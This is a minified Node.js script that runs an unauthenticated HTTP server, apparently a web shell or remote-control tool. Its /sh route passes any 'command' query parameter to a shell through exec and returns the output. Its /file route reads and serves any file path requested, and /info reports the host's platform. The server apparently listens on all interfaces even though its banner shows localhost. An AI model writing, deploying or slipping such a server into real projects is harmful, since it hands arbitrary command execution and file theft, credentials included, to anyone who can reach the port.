import{argv,exit,platform,arch}from"node:process";import{promisify,styleText}from"node:util";import{readFile}from"node:fs/promises";import{exec}from"node:child_process";import{extname}from"node:path";import{Server}from"node:http";new class{#e=new Server;#t=(e=>void 0===e||isNaN(+e)?0:+e)(argv[2]);constructor(){const e=(e,t)=>(this.#i(e,t),"GET"!==e.method?t.writeHead(404).end():e.url?.includes("/sh")?this.#o(e,t):e.url?.includes("/file")?this.#r(e,t):e.url?.includes("/info")?this.#n(e,t):e.url?.includes("/status")?t.writeHead(204).end():t.writeHead(404).end());try{const{port:t}=this.#e.on("request",e).listen(this.#t,(()=>console.info(styleText(["bold","green"],`\n[*] Server: http://127.0.0.1:${t}`)))).address();process.on("SIGINT",this.#s),process.on("SIGTERM",this.#s)}catch(e){console.trace(e),this.#s()}}#i=({method:e,url:t},i)=>{const o=Date.now(),r=styleText(["bgWhite","bold","black"],`[${e}]`),n=styleText(["blue","bold"],`${t}`);i.on("finish",(()=>{const e=Date.now()-o;console.log(`${r} - ${n} - ${i.statusCode} - ${e}ms`)}))};#n=(e,t)=>(t.writeHead(200,this.#a("plain")).write(`${platform} ${arch}`),t.end());#o=async(e,t)=>{const{command:i}=this.#p(e.url);if(void 0===i)return t.writeHead(400).end();try{const{stderr:e,stdout:o}=await promisify(exec)(i);t.writeHead(200,this.#a("plain")).write(`${o} \n\n${e}`)}catch(e){t.writeHead(400,this.#a("json")).write(JSON.stringify(e))}return t.end()};#r=async(e,t)=>{const{name:i}=this.#p(e.url);if(void 0===i)return t.writeHead(400).end();try{const e=this.#a(extname(i));t.writeHead(200,e).write(await readFile(i))}catch(e){console.trace(e),t.writeHead(400).write(e)}return t.end()};#p=e=>{const[t,i]=e.split("?");if(void 0===i)return{query:{}};const o=new URL("https://example.com"+e),r=new URLSearchParams(o.search);return Object.fromEntries(r.entries())};#a=e=>{let t;return t=e.includes(".")?this.#d[e.split(".").pop()]:this.#d[e],void 0!==t?{"Content-Type":t}:void 0};#d={zip:"application/zip",pdf:"application/pdf",json:"application/json",xml:"application/xml",plain:"text/plain",txt:"text/plain",html:"text/html",css:"text/css",png:"image/png",jpg:"image/jpg",jpeg:"image/jpeg",gif:"image/gif",svg:"image/svg+xml",webp:"image/webp",mp3:"audio/mp3",wav:"audio/wav",ogg:"audio/ogg",mp4:"video/mp4",mkv:"video/mkv",webm:"video/webm",avi:"video/x-msvideo"};#s=()=>{console.info(styleText(["bold","red"],"\n\n[!] Stopping server.")),this.#e.close(),exit(1)}};